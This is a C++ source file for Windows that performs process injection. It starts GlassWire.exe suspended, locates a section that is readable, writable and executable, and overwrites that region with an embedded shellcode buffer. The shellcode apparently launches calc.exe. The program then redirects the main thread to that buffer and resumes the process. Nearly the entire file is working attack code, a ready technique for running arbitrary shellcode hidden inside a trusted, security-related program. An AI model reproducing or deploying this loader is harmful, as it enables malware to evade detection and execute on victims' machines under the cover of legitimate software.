#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

const LPCSTR TargetFile = "C:\\Users\\cys\\Desktop\\GlassWire.exe";

DWORD_PTR load_offset;
DWORD_PTR section_RWX_size;


unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

bool parsePE(const string& pePath) {
    ifstream peFile(pePath, ios::binary);
    IMAGE_DOS_HEADER dosHeader;
    peFile.read(reinterpret_cast<char*>(&dosHeader), sizeof(dosHeader));
    peFile.seekg(dosHeader.e_lfanew, ios::beg);
    IMAGE_NT_HEADERS ntHeaders;
    peFile.read(reinterpret_cast<char*>(&ntHeaders), sizeof(ntHeaders));

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER sectionHeader;
        peFile.read(reinterpret_cast<char*>(&sectionHeader), sizeof(sectionHeader));

        if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_READ) &&
            (sectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (sectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            cout << "[*]Section Name: " << string(reinterpret_cast<char*>(sectionHeader.Name), 8) << endl;
            cout << "[*]Virtual Address: 0x" << sectionHeader.VirtualAddress << endl;
            cout << "[*]Virtual Size: 0x" << sectionHeader.Misc.VirtualSize << endl;
            load_offset = sectionHeader.VirtualAddress;
            section_RWX_size = sectionHeader.Misc.VirtualSize;
        }
    }

    return true;
}

int main() {
    parsePE(TargetFile);

    //创建挂起进程
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    CreateProcessA(
        TargetFile,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!pi.hProcess) { cerr << "[-]Creat process fail"; return 1; }
    cout << "[+]Process PID: " << pi.dwProcessId << endl;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID RemoteImageBase;
    BOOL readpeb = NULL;

#ifdef _WIN64
    readpeb = ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _X86_
    readpeb = ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
    if (!readpeb) {
        DWORD error = GetLastError();
        cout << "[-]ReadProcessMemory failed with error code: " << error << endl;
        return 1;
    }

    //定位RWX区域地址
    LPVOID load_base_shifted = (LPBYTE)RemoteImageBase + load_offset;
    cout << "[+]RWX Section in : 0x" << hex << load_base_shifted << endl;

    BYTE* zeroBuffer = (BYTE*)calloc(section_RWX_size, sizeof(BYTE));
    WriteProcessMemory(pi.hProcess, load_base_shifted, zeroBuffer, section_RWX_size, NULL);
    WriteProcessMemory(pi.hProcess, load_base_shifted, buf, sizeof(buf), NULL);

#ifdef _WIN64
    ctx.Rip = (SIZE_T)(LPBYTE)load_base_shifted;
#endif
#ifdef _X86_
    ctx.Eip = (SIZE_T)(LPBYTE)load_base_shifted;
#endif

    cout << "[+]SetThreadContext" << endl;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
